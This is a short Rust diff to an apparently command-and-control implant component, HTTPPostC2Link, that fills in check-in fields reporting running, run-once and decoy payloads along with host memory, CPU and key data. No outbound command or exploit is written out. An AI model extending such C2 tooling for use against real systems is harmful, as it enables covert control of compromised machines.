@@ -499,11 +499,30 @@ impl LinkFetch for HTTPPostC2Link {
     ) -> Result<Vec<u8>, anyhow::Error> {
 
 
-        let mut running_thread_payload_string: Vec<String> = vec![];
+        let mut running_thread_payload: Vec<String> = vec![];
         for (_thread,payload_list) in &run_data.running_thread_payload {
-            running_thread_payload_string.push(payload_list.string_payload_compact());
+            running_thread_payload.push(payload_list.string_payload_compact());
         }
-
+        let mut runonce_payload: Vec<String> = vec![];
+        for payload_list in &run_data.runonce_payload {
+            runonce_payload.push(payload_list.string_payload_compact());
+        }
+        let mut running_thread_decoy_update: Vec<String> = vec![];
+        for (_thread,payload_list) in &run_data.running_thread_decoy_update {
+            running_thread_decoy_update.push(payload_list.string_payload_compact());
+        }
+        let mut runonce_decoy_update: Vec<String> = vec![];
+        for payload_list in &run_data.runonce_decoy_update {
+            runonce_decoy_update.push(payload_list.string_payload_compact());
+        }
+        let mut running_thread_decoy_payload: Vec<String> = vec![];
+        for (_thread,payload_list) in &run_data.running_thread_decoy_payload {
+            running_thread_decoy_payload.push(payload_list.string_payload_compact());
+        }
+        let mut runonce_decoy_payload: Vec<String> = vec![];
+        for payload_list in &run_data.runonce_decoy_payload {
+            runonce_decoy_payload.push(payload_list.string_payload_compact());
+        }
 
 
 
@@ -537,13 +556,13 @@ impl LinkFetch for HTTPPostC2Link {
             used_memory: bytes_to_gigabytes_string(sys.used_memory()),
             nb_cpu: sys.cpus().len(),
             data_operation: self.dataoperation.clone(),
-            running_thread_payload: running_thread_payload_string.clone(),
+            running_thread_payload: running_thread_payload,
             //TODO
-            runonce_payload: vec![],
-            running_thread_decoy_update: vec![],
-            runonce_decoy_update: vec![],
-            running_thread_decoy_payload: vec![],
-            runonce_decoy_payload: vec![],
+            runonce_payload: runonce_payload,
+            running_thread_decoy_update: running_thread_decoy_update,
+            runonce_decoy_update: runonce_decoy_update,
+            running_thread_decoy_payload: running_thread_decoy_payload,
+            runonce_decoy_payload: runonce_decoy_payload,
 
             peer_public_key_bytes: peer_public_key_bytes.clone(),
             sign_bytes: vec![],
